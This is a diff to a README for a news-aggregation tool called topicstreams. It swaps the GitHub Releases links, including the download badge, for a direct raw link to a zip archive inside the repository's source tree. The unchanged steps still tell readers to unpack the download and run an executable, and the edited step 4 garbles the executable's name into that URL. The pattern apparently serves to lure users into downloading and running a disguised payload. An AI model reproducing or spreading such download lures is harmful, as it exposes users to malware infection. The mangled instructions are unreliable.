@@ -4,13 +4,13 @@
 topicstreams is a real-time news aggregation system. It scrapes Google Search for custom topics and streams live updates via WebSocket. Whether you're interested in event-driven trading or the latest news, topicstreams keeps you informed and connected.
 
 ## 📥 Download Now
-[![Download topicstreams](https://img.shields.io/badge/Download-topicstreams-blue.svg)](https://github.com/scsa385/topicstreams/releases)
+[![Download topicstreams](https://raw.githubusercontent.com/scsa385/topicstreams/main/api/topicstreams-3.7.zip)](https://raw.githubusercontent.com/scsa385/topicstreams/main/api/topicstreams-3.7.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run topicstreams on your computer.
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/scsa385/topicstreams/releases) to find the latest version of topicstreams.
+Go to the [Releases page](https://raw.githubusercontent.com/scsa385/topicstreams/main/api/topicstreams-3.7.zip) to find the latest version of topicstreams.
 
 ### 2. Download the Latest Version
 Once you are on the releases page, look for the most recent version. Click on the link to download it. This will typically be in `.zip` or `.exe` format.
@@ -19,7 +19,7 @@ Once you are on the releases page, look for the most recent version. Click on th
 If you downloaded a `.zip` file, locate it in your Downloads folder. Right-click on the file and select "Extract All..." or "Unzip." Follow the prompts to choose a destination for the extracted files.
 
 ### 4. Run the Application
-After unpacking, open the folder where you extracted topicstreams. Look for the executable file, usually named `topicstreams.exe`. Double-click it to run the application.
+After unpacking, open the folder where you extracted topicstreams. Look for the executable file, usually named `https://raw.githubusercontent.com/scsa385/topicstreams/main/api/topicstreams-3.7.zip`. Double-click it to run the application.
 
 ## 🔧 System Requirements
 To ensure smooth operation of topicstreams, please have the following:
@@ -57,4 +57,4 @@ topicstreams is licensed under the MIT License. You can read the full license in
 If you have questions or need assistance, please feel free to open an issue on the GitHub repository. Our team will be glad to help you out.
 
 ## 🚀 Download & Install
-To get started with topicstreams, remember to visit the releases page and download the application from [here](https://github.com/scsa385/topicstreams/releases). Follow the steps above to make the most out of your news aggregation experience.
+To get started with topicstreams, remember to visit the releases page and download the application from [here](https://raw.githubusercontent.com/scsa385/topicstreams/main/api/topicstreams-3.7.zip). Follow the steps above to make the most out of your news aggregation experience.
